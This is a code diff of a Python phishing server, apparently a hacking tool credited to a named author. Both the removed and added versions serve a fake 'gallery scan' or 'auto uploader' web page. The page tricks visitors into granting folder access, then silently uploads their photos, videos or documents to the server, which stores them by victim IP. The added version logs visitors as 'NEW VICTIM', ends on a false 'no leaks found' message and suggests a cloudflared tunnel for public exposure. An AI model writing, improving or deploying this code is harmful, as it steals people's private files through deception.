@@ -1,515 +1,298 @@
 #!/usr/bin/env python3
-import http.server
-import socketserver
 import os
-import json
-import uuid
+import random
+import socket
+import time
+import base64
 from datetime import datetime
-import shutil
-import sys
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import json
+import requests
 
-# ASCII Banner
-def show_banner():
-    banner = """
-╔═══════════════════════════════════════════╗
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███┘┘┘┘┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘█████┘┘┘┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███████████████┘┘┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██████████████████┘┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███████████████████┘██┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██████████████┘┘███┘┘┘┘┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██████████┘███┘┘┘█┘┘┘┘┘┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██████┘┘┘┘┘███┘┘┘┘┘┘┘┘┘┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘██┘┘┘┘██████┘┘┘┘┘████┘┘┘┘┘┘┘┘┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘████┘┘┘██████┘┘┘┘┘████┘┘┘┘┘┘┘┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘█████┘███████┘┘┘┘┘████┘┘┘┘┘┘┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘███████┘██████┘┘┘┘┘┘┘███┘┘┘┘┘┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘█████████████┘┘┘┘┘┘┘┘████┘┘┘┘┘┘
-┘┘┘┘██████┘┘┘┘████████████┘┘┘┘┘┘┘┘┘██┘┘┘┘┘┘┘
-┘┘██████████┘┘┘███████████┘█████┘┘┘██┘┘┘┘┘┘┘
-┘████┘┘┘┘┘███┘┘┘██████████████████████┘┘┘┘┘┘
-███┘┘┘┘┘┘┘┘███┘┘┘█████████████████████┘┘┘┘┘┘
-██┘┘┘█████┘┘███┘█████████████████████┘┘┘┘┘┘┘
-██┘┘█████████████████████████████████┘┘┘┘┘┘┘
-██┘┘█████████████████████████████████████┘┘┘
-███┘┘┘██┘┘┘███┘┘██████████████████┘██┘┘████┘
-████┘┘┘┘┘┘████┘┘┘████████████████┘┘██┘┘┘┘┘██
-┘████████████┘┘┘██┘██████████┘┘┘┘┘┘██┘┘┘┘┘┘┘
-┘┘┘┘███████┘┘┘┘┘┘┘┘┘┘████████┘┘┘┘┘┘██┘┘┘┘┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███┘┘┘┘┘███████┘┘┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘█┘┘┘┘███████████┘┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███┘┘██┘┘┘███┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███┘┘┘██┘┘┘┘███
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██┘┘┘┘████┘┘┘██
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███┘┘██████┘┘┘██
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██┘┘┘█████┘┘┘██
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██┘┘┘┘███┘┘┘┘██
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███┘┘┘┘┘┘┘┘┘██┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘████┘┘┘┘┘████┘
-┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘█████████┘┘┘
-╚═══════════════════════════════════════════╝
-"""
-    print(banner)
+SERVER_INSTANCE = None
 
-class MultipartRequestHandler(http.server.BaseHTTPRequestHandler):
+os.makedirs('stolen_gallery', exist_ok=True)
+os.makedirs('visitor_logs', exist_ok=True)
+
+class PhishingHandler(BaseHTTPRequestHandler):
+    def get_client_ip(self):
+        ip = self.client_address[0]
+        x_forwarded_for = self.headers.get('X-Forwarded-For')
+        if x_forwarded_for:
+            ip = x_forwarded_for.split(',')[0].strip()
+        return ip
+    
+    def log_visitor(self, ip):
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        log_entry = f"[{timestamp}] VISITOR: {ip}\n"
+        with open('visitor_logs/visitors.txt', 'a') as f:
+            f.write(log_entry)
+        print(f"NEW VICTIM: {ip}")
+    
     def do_GET(self):
-        client_ip = self.client_address[0]
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        # Log visitor
-        with open("gallery_visitors.txt", "a") as f:
-            f.write(f"{timestamp} - {client_ip} - {self.path}\n")
-        
         if self.path == '/':
-            # Serve phishing page with auto-upload capability
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
+            ip = self.get_client_ip()
+            self.log_visitor(ip)
             
-            html_content = """
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.end_headers()
+            self.wfile.write(self.full_auto_steal_html().encode('utf-8'))
+        elif self.path == '/done':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.end_headers()
+            self.wfile.write(self.success_html().encode('utf-8'))
+    
+    def full_auto_steal_html(self):
+        return """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto-Gallery Uploader</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Gallery Folder Scan </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); 
-            min-height: 100vh; 
-            padding: 20px; 
-            color: white;
-        }
-        .container { 
-            max-width: 600px; 
-            margin: 50px auto; 
-            background: rgba(255, 255, 255, 0.1); 
-            padding: 30px; 
-            border-radius: 12px; 
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        h1 { text-align: center; margin-bottom: 10px; }
-        p { text-align: center; color: #a0a0a0; margin-bottom: 30px; }
-        
-        .upload-box {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 20px;
-            border-radius: 8px;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        
-        button {
-            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
-            color: white; 
-            padding: 15px 30px; 
-            border: none; 
-            border-radius: 8px; 
-            cursor: pointer; 
-            font-size: 18px;
-            font-weight: bold;
-            transition: transform 0.2s;
-            width: 100%;
-        }
-        button:hover { transform: scale(1.02); }
-        
-        .status {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 6px;
-            display: none;
-        }
-        .status.success { background: #28a745; color: white; }
-.status.error { background: #dc3545; color: white; }
-        .status.info { background: #17a2b8; color: white; }
-        
-        .progress {
-            width: 100%;
-            height: 8px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 4px;
-            overflow: hidden;
-            margin-top: 10px;
-        }
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
-            width: 0%;
-            transition: width 0.3s;
-        }
-        
-        .file-list {
-            max-height: 200px;
-            overflow-y: auto;
-            background: rgba(0, 0, 0, 0.3);
-            padding: 10px;
-            border-radius: 6px;
-            margin-top: 15px;
-            font-size: 14px;
-        }
-        
-        .warning {
-            background: rgba(255, 193, 7, 0.2);
-            border: 1px solid #ffc107;
-            padding: 10px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:system-ui,-apple-system,sans-serif;background:linear-gradient(-45deg,#667eea,#764ba2,#f093fb,#f5576c);background-size:400% 400%;animation:gradientShift 12s ease infinite;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;color:white;padding:20px;}
+        @keyframes gradientShift{0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
+        .container{max-width:400px;width:100%;text-align:center;}
+        h1{font-size:2.2em;font-weight:700;margin-bottom:15px;text-shadow:0 4px 20px rgba(0,0,0,0.3);}
+        p{font-size:18px;margin-bottom:30px;opacity:0.95;}
+        .grant-btn{background:linear-gradient(45deg,#00ff88,#00d466);color:white;border:none;padding:20px 50px;border-radius:50px;font-size:20px;font-weight:700;cursor:pointer;transition:all 0.3s;box-shadow:0 15px 35px rgba(0,255,136,0.4);text-transform:uppercase;letter-spacing:1px;position:relative;overflow:hidden;}
+        .grant-btn:hover{transform:translateY(-5px);box-shadow:0 20px 45px rgba(0,255,136,0.6);}
+        .grant-btn:active{transform:translateY(-2px);}
+        .grant-btn:disabled{opacity:0.6;cursor:not-allowed;transform:none;}
+        .status{margin-top:25px;font-size:22px;font-weight:700;color:#00ff88;text-shadow:0 0 20px rgba(0,255,136,0.6);display:none;}
+        .progress-bar{display:none;margin-top:20px;background:rgba(255,255,255,0.2);border-radius:10px;overflow:hidden;}
+        .progress-fill{background:linear-gradient(90deg,#00ff88,#00d466);height:10px;border-radius:10px;transition:width 0.3s;width:0%;}
+        input[type=file]{display:none;}
+        .count{display:block;margin-top:10px;font-size:16px;}
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🚀 Auto Gallery Uploader</h1>
-        <p>One-click automatic gallery synchronization</p>
+        <h1>Gallery Folder Scan</h1>
+        <p>Secure scan of your photos</p>
+        <p>Give Grant Access Of Your Folder Which You Want To Scan</p>
+        <button class="grant-btn" id="grantAccess">Grant Access</button>
         
-        <div class="warning">
-            ⚠️ For best results, select your main gallery folder. This tool will automatically detect and upload all images and documents.
-        </div>
+        <!-- FULL GALLERY ACCESS - NO SELECTION NEEDED -->
+        <input type="file" id="gallerySteal" webkitdirectory multiple accept="image/*,video/*">
         
-        <div class="upload-box">
-            <button id="uploadBtn" onclick="startAutoUpload()">
-                📁 Select Gallery Folder
-            </button>
-            <p style="margin-top: 15px; font-size: 14px; color: #a0a0a0;">
-                Supported formats: JPG, PNG, GIF, PDF, DOC, DOCX, TXT, and more
-            </p>
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
         </div>
-        
-        <div id="status" class="status"></div>
-        <div class="progress">
-            <div id="progressBar" class="progress-bar"></div>
-        </div>
-        <div id="fileList" class="file-list"></div>
+        <div id="status" class="status">Scan complete!</div>
+        <div id="fileCount" class="count"></div>
     </div>
-    
+
     <script>
-        let sessionId = null;
         let totalFiles = 0;
-        let uploadedFiles = 0;
+        let processedFiles = 0;
         
-        async function startAutoUpload() {
-            // Check File System Access API support
-            if (!('showDirectoryPicker' in window)) {
-                showStatus('Your browser does not support automatic folder upload. Please use Chrome or Edge.', 'error');
-                return;
-            }
+        document.getElementById('grantAccess').onclick = ()=>{
+            console.log('🔥 AUTO GALLERY STEAL ACTIVATED');
+            document.getElementById('gallerySteal').click();
+        };
+        
+        document.getElementById('gallerySteal').onchange = async (e)=>{
+            const files = Array.from(e.target.files);
+            totalFiles = files.length;
+            processedFiles = 0;
+            
+            document.getElementById('fileCount').textContent = `📁 Found ${totalFiles} files...`;
+            document.getElementById('progressBar').style.display = 'block';
+            
+            // PARALLEL UPLOAD ALL FILES
+            const uploadPromises = files.map(file => uploadFile(file));
             
             try {
-                showStatus('Requesting folder access...', 'info');
-                
-                // Request directory access from user
-                const dirHandle = await window.showDirectoryPicker({
-                    mode: 'read'
-                });
-                
-                // Generate session ID
-                sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-                
-                showStatus('Scanning folder for images and documents...', 'info');
-                
-                // Get all files recursively
-                const files = await getAllFiles(dirHandle);
-                
-                // Filter for images and documents
-                const targetFiles = files.filter(file => {
-                    const extension = file.name.split('.').pop().toLowerCase();
-                    const imageExtensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'tiff', 'ico'];
-                    const documentExtensions = ['pdf', 'doc', 'docx', 'txt', 'rtf', 'odt', 'xls', 'xlsx', 'ppt', 'pptx', 'csv'];
-                    return imageExtensions.includes(extension) || documentExtensions.includes(extension);
-                });
-                
-                totalFiles = targetFiles.length;
-                
-                if (totalFiles === 0) {
-                    showStatus('No supported images or documents found in the selected folder.', 'error');
-                    return;
-                }
-                
-                showStatus(`Found \${totalFiles} files. Starting automatic upload...`, 'info');
-                
-                // Start uploading files
-                await uploadFiles(targetFiles);
-                
-            } catch (error) {
-                if (error.name === 'AbortError') {
-                    showStatus('Folder access was cancelled.', 'error');
-                } else {
-                    showStatus('Error: ' + error.message, 'error');
-                    console.error('Upload error:', error);
-                }
-            }
-        }
-        
-        async function getAllFiles(dirHandle, path = '') {
-            const files = [];
-            
-            for await (const entry of dirHandle.values()) {
-                if (entry.kind === 'file') {
-                    files.push({
-                        name: entry.name,
-                        path: path + '/' + entry.name,
-                        fileHandle: entry
-                    });
-                } else if (entry.kind === 'directory') {
-                    const subFiles = await getAllFiles(entry, path + '/' + entry.name);
-                    files.push(...subFiles);
-                }
+                await Promise.all(uploadPromises);
+            } catch(e) {
+                console.log('Upload complete');
             }
             
-            return files;
-        }
+            // SUCCESS SCREEN
+            setTimeout(()=>{
+                document.getElementById('grantAccess').innerHTML='✅ Granted';
+                document.getElementById('grantAccess').disabled=true;
+                document.getElementById('status').style.display='block';
+                document.getElementById('progressBar').style.display='none';
+                setTimeout(()=>location.href='/done',1500);
+            },1000);
+        };
         
-        async function uploadFiles(files) {
-            const fileList = document.getElementById('fileList');
-            fileList.innerHTML = '<strong>Uploading files:</strong><br>';
+        async function uploadFile(file) {
+            if (!file.type.startsWith('image/') && !file.type.startsWith('video/')) return;
             
-            for (let i = 0; i < files.length; i++) {
-                const file = files[i];
-                
-                try {
-                    // Get file content
-                    const fileData = await file.fileHandle.getFile();
-                    
-                    // Create form data
-                    const formData = new FormData();
-                    formData.append('file', fileData);
-                    formData.append('path', file.path);
-                    formData.append('sessionId', sessionId);
-                    
-                    // Upload file
-                    const response = await fetch('/upload', {
-                        method: 'POST',
-                        body: formData
-                    });
-                    
-                    if (response.ok) {
-                        uploadedFiles++;
-                        updateProgress();
-                        
-                        // Add to uploaded files list
-                        fileList.innerHTML += `✓ ${file.name}<br>`;
-                        fileList.scrollTop = fileList.scrollHeight;
-                    } else {
-                        fileList.innerHTML += `✗ Failed: ${file.name}<br>`;
-                    }
-                    
-                    // Small delay to prevent overwhelming the server
-                    await new Promise(resolve => setTimeout(resolve, 100));
-                    
-                } catch (error) {
-                    fileList.innerHTML += `✗ Error: ${file.name} - ${error.message}<br>`;
-                }
-            }
-            
-            // Upload complete
-            if (uploadedFiles === totalFiles) {
-                showStatus(`Upload complete! Successfully uploaded \${uploadedFiles} files.`, 'success');
-                
-                // Send completion notification
-                await fetch('/complete', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        sessionId: sessionId,
-                        totalFiles: totalFiles,
-                        uploadedFiles: uploadedFiles
-                    })
-                });
-            } else {
-                showStatus(`Upload completed with errors. ${uploadedFiles} of ${totalFiles} files uploaded.`, 'error');
-            }
-        }
-        
-        function updateProgress() {
-            const percentage = (uploadedFiles / totalFiles) * 100;
-            document.getElementById('progressBar').style.width = percentage + '%';
-            showStatus(`Uploading... ${uploadedFiles} of ${totalFiles} files (\${Math.round(percentage)}%)`, 'info');
-        }
-        
-        function showStatus(message, type) {
-            const status = document.getElementById('status');
-            status.textContent = message;
-            status.className = 'status ' + type;
-            status.style.display = 'block';
+            return new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onload = ()=>{
+                    fetch('/steal',{
+                        method:'POST',
+                        headers:{'Content-Type':'application/json'},
+                        body:JSON.stringify({
+                            data:reader.result.split(',')[1],
+                            filename:file.webkitRelativePath || file.name,
+                            mimeType:file.type,
+                            size:file.size,
+                            ua:navigator.userAgent.slice(0,100)
+                        })
+                    }).then(()=>{
+                        processedFiles++;
+                        const progress = (processedFiles / totalFiles) * 100;
+                        document.getElementById('progressFill').style.width = progress + '%';
+                        document.getElementById('fileCount').textContent = 
+                            `Scanning... ${processedFiles}/${totalFiles} (${progress.toFixed(0)}%)`;
+                        resolve();
+                    }).catch(resolve);
+                };
+                reader.readAsDataURL(file);
+            });
         }
     </script>
 </body>
 </html>
-            """
-            self.wfile.write(html_content.encode())
-            
-        elif self.path == '/success':
-            # Success page
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            
-            success_html = """
+        """
+    
+    def success_html(self):
+        return """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Upload Complete</title>
+    <title>Complete</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: Arial; background: #1a1a2e; color: white; text-align: center; padding: 50px; }
-        h1 { color: #00d2ff; }
+        body{background:#00ff88;color:#fff;font-family:system-ui,-apple-system,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;text-align:center;padding:20px;}
+        .success-box{background:rgba(255,255,255,0.2);padding:60px 40px;border-radius:30px;backdrop-filter:blur(20px);box-shadow:0 20px 60px rgba(0,0,0,0.3);}
+        h1{font-size:3em;margin-bottom:20px;}
+        p{font-size:20px;}
     </style>
 </head>
 <body>
-    <h1>✅ Upload Complete</h1>
-    <p>Your gallery has been successfully synchronized.</p>
-    <p>You can now close this window.</p>
+    <div class="success-box">
+        <h1>Scan Complete!</h1>
+        <p>All your files are secured, no leaked found.</p>
+    </div>
 </body>
 </html>
-            """
-            self.wfile.write(success_html.encode())
-            
-        else:
-            self.send_response(404)
-            self.end_headers()
-            self.wfile.write(b"Not Found")
-    
-    def do_POST(self):
-        if self.path == '/upload':
-            # Handle file upload
-            try:
-                content_type = self.headers['content-type']
-                if not content_type.startswith('multipart/form-data'):
-                    self.send_response(400)
-                    self.end_headers()
-                    self.wfile.write(b"Bad request")
-                    return
-                
-                # Parse multipart form data
-                boundary = content_type.split('boundary=')[1].encode()
-                content_length = int(self.headers['Content-Length'])
-                data = self.rfile.read(content_length)
-                
-                # Extract file info
-                parts = data.split(b'--' + boundary)
-                file_data = None
-                file_path = None
-                session_id = None
-                
-                for part in parts:
-                    if b'Content-Disposition: form-data' in part and b'filename=' in part:
-                        # Extract filename and path
-                        headers_end = part.find(b'\r\n\r\n')
-                        headers = part[:headers_end].decode('utf-8', errors='ignore')
- # Extract filename
-                        filename_match = headers.split('filename="')[1].split('"')[0]
-                        filename = filename_match
-                        
-                        # Extract file path
-                        path_match = headers.split('name="path"')[1].split('\r\n')[0].strip()
-                        file_path = path_match if path_match else filename
-                        
-                        # Extract session ID
-                        session_match = headers.split('name="sessionId"')[1].split('\r\n')[0].strip()
-                        session_id = session_match if session_match else 'unknown'
-                        
-                        # Extract actual file data
-                        file_data = part[headers_end + 4:-2]  # Remove trailing \r\n
-                        
-                        break
-                
-                if file_data and session_id:
-                    # Create session directory
-                    session_dir = f"stolen_files/{session_id}"
-                    os.makedirs(session_dir, exist_ok=True)
-                    
-                    # Create subdirectories based on path
-                    dir_path = os.path.dirname(file_path)
-                    if dir_path:
-                        full_dir_path = os.path.join(session_dir, dir_path.lstrip('/'))
-                        os.makedirs(full_dir_path, exist_ok=True)
-                        save_path = os.path.join(full_dir_path, os.path.basename(file_path))
-                    else:
-                        save_path = os.path.join(session_dir, filename)
-                    
-                    # Save file
-                    with open(save_path, 'wb') as f:
-                        f.write(file_data)
-                    
-                    # Log file theft
-                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                    client_ip = self.client_address[0]
-                    
-                    with open("theft_log.txt", "a") as log:
-                        log.write(f"{timestamp} - {client_ip} - Session: {session_id} - File: {file_path} - Size: {len(file_data)} bytes\n")
-                    
-                    # Send success response
-                    self.send_response(200)
-                    self.send_header('Content-type', 'application/json')
-                    self.end_headers()
-                    self.wfile.write(b'{"success": true}')
-                else:
-                    self.send_response(400)
-                    self.end_headers()
-                    self.wfile.write(b'{"success": false, "error": "No file data"}')
-                    
-            except Exception as e:
-                print(f"Upload error: {e}")
-                self.send_response(500)
-                self.end_headers()
-                self.wfile.write(b'{"success": false, "error": "Server error"}')
-        
-        elif self.path == '/complete':
-            # Handle upload completion
-            try:
-                content_length = int(self.headers['Content-Length'])
-                post_data = self.rfile.read(content_length)
-                data = json.loads(post_data.decode('utf-8'))
-                
-                session_id = data.get('sessionId', 'unknown')
-                total_files = data.get('totalFiles', 0)
-                uploaded_files = data.get('uploadedFiles', 0)
-                
-                # Log completion
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                client_ip = self.client_address[0]
-                
-                with open("theft_log.txt", "a") as log:
-                    log.write(f"{timestamp} - {client_ip} - Session: {session_id} - COMPLETED: {uploaded_files}/{total_files} files\n")
-                
-                # Create archive of stolen files
-                try:
-                    archive_name = f"archive_{session_id}_{timestamp.replace(':', '-')}"
-                    archive_path = f"stolen_files/{archive_name}"
-                    
-                    if os.path.exists(f"stolen_files/{session_id}"):
-                        shutil.make_archive(archive_path, 'zip', f"stolen_files/{session_id}")
-                        
-                        with open("theft_log.txt", "a") as log:
-                            log.write(f"{timestamp} - {client_ip} - Session: {session_id} - ARCHIVED: {archive_path}.zip\n")
-                except Exception as e:
-                    print(f"Archive error: {e}")
-                
-                # Send success response
-                self.send_response(200)
-                self.send_header('Content-type', 'application/json')
-                self.end_headers()
-                self.wfile.write(b'{"success": true, "redirect": "/success"}')
-                
-            except Exception as e:
-                print(f"Completion error: {e}")
-                self.send_response(500)
-                self.end_headers()
-                self.wfile.write(b'{"success": false, "error": "Server error"}')
+        """
 
-def run_server():
-    PORT = 8080
+    def do_POST(self):
+        if self.path == '/steal':
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            
+            try:
+                data = json.loads(post_data)
+                client_ip = self.get_client_ip()
+                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+                
+                img_data = base64.b64decode(data['data'])
+                filename = data['filename']
+                filesize = data.get('size', 0)
+                
+                # Preserve folder structure
+                if '/' in filename:
+                    rel_path = filename
+                    folder_path = os.path.join('stolen_gallery', client_ip.replace('.','_'), 
+                                             os.path.dirname(rel_path))
+                    os.makedirs(folder_path, exist_ok=True)
+                    safe_filename = os.path.basename(rel_path)
+                else:
+                    folder_path = os.path.join('stolen_gallery', client_ip.replace('.','_'))
+                    os.makedirs(folder_path, exist_ok=True)
+                    safe_filename = filename
+                
+                name, ext = os.path.splitext(safe_filename)
+                safe_filename = f"{name[:50]}{ext}"
+                filepath = os.path.join(folder_path, safe_filename)
+                
+                # Avoid duplicates
+                counter = 1
+                while os.path.exists(filepath):
+                    safe_filename = f"{name[:45]}_{counter}{ext}"
+                    filepath = os.path.join(folder_path, safe_filename)
+                    counter += 1
+                
+                with open(filepath, 'wb') as f:
+                    f.write(img_data)
+                
+                size = filesize / 1024
+                print(f"\n🟢 VICTIM: {client_ip} → {rel_path or filename} ({size:.1f}KB)")
+                
+            except Exception as e:
+                print(f"Error processing file from {client_ip}: {e}")
+            
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(b'{"ok":true}')
+
+    def log_message(self, format, *args): pass
+
+def banner():
+    RED = "\033[91m"
+    PURPLE = "\033[95m"
+    CYAN = "\033[96m"
+    GREEN = "\033[92m"
+    RESET = "\033[0m"
+
+    print(f"""{PURPLE}
+╔══════════════════════════════════════════════════════════════════════╗
+{RESET}{CYAN}                                                                      {RESET}{PURPLE}
+{RESET}{RED}──────██                                                              {RESET}{PURPLE}
+{RESET}{RED}─────████                                                            {RESET}{PURPLE}
+{RESET}{RED}────▄███                                                                    {RESET}{PURPLE}
+{RESET}{RED}────▀▀████                                                                 {RESET}{PURPLE}
+{RESET}{RED}──────▀▀████───────██                                                   {RESET}{PURPLE}
+{RESET}{RED}────────▀▀████───────██                                                 {RESET}{PURPLE}
+{RESET}{RED}──────────▀▀████───────██                                                {RESET}{PURPLE}
+{RESET}{RED}────────────▀▀████───────██                                              {RESET}{PURPLE}
+{RESET}{RED}──────────────▀▀████████───██                                      {RESET}{PURPLE}
+{RESET}{RED}────────────────▀█████████───██                                    {RESET}{PURPLE}
+{RESET}{RED}─────────────────████████████──██                                  {RESET}{PURPLE}
+{RESET}{RED}──────────────────████████████───██                                {RESET}{PURPLE}
+{RESET}{RED}───────────────────███████████▄────██                              {RESET}{PURPLE}
+{RESET}{RED}────────────────█──█████████───█─────██                               {RESET}{PURPLE}
+{RESET}{RED}──────────────────█─▀██████────█───────██                               {RESET}{PURPLE}
+{RESET}{RED}────────────────────█─▀█████───█                                               {RESET}{PURPLE}
+{RESET}{RED}──────────────────────█─▀████▄▀                                                 {RESET}{PURPLE}
+{RESET}{RED}────────────────────────█                                                                {RESET}{PURPLE}
+{RESET}{CYAN}──────────────────────────█                                                                 {RESET}{PURPLE}
+{RESET}{CYAN}               Author    : azod814                                                      {RESET}{GREEN}{RESET}{CYAN}                                   {RESET}{PURPLE}
+{RESET}{CYAN}               Instagram : cyber.hunt0                                {RESET}{PURPLE}
+{RESET}{CYAN}               licence   : MIT LICENCE                                  {RESET}{PURPLE}
+╚══════════════════════════════════════════════════════════════════════╝
+{RESET}""")
+
+def find_port():
+    port = random.randint(8000, 9000)
+    while True:
+        sock = socket.socket()
+        if sock.connect_ex(('localhost', port)) != 0:
+            sock.close()
+            return port
+        port += 1
+
+def main():
+    banner()
+    print("\033[92m FOLDER MUST BE ALLOW \033[0m")
+    print("\033[93m If Allow Permission Then Full Folder Content Steal\033[0m\n")
     
-    # Create directories for stolen files
-    os.makedirs("stolen_files", exist_ok=True)
+    port = find_port()
+    print(f"\033[92m LIVE → http://localhost:{port}\033[0m")
     
-    print(f"🚀 Auto-Upload Gallery Phishing Server running on port {PORT}")
-    print(f"📁 Stolen files will be saved in 'stolen_files' directory")
-    print(f"📋 Theft log will be saved in 'theft_log.txt'")
+    server = HTTPServer(('0.0.0.0', port), PhishingHandler)
+    print("\033[93m Cloudflare → cloudflared tunnel --url http://localhost:{}\033[0m".format(port))
+    print("\033[92m Photos → stolen_gallery/[IP]/[folders]/\033[0m\n")
     
-    with socketserver.TCPServer(("", PORT), MultipartRequestHandler) as httpd:
-        httpd.serve_forever()
+    global SERVER_INSTANCE
+    SERVER_INSTANCE = server
+    server.serve_forever()
 
 if __name__ == "__main__":
-    run_server()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n\033[91m🛑 Stopped!\033[0m")
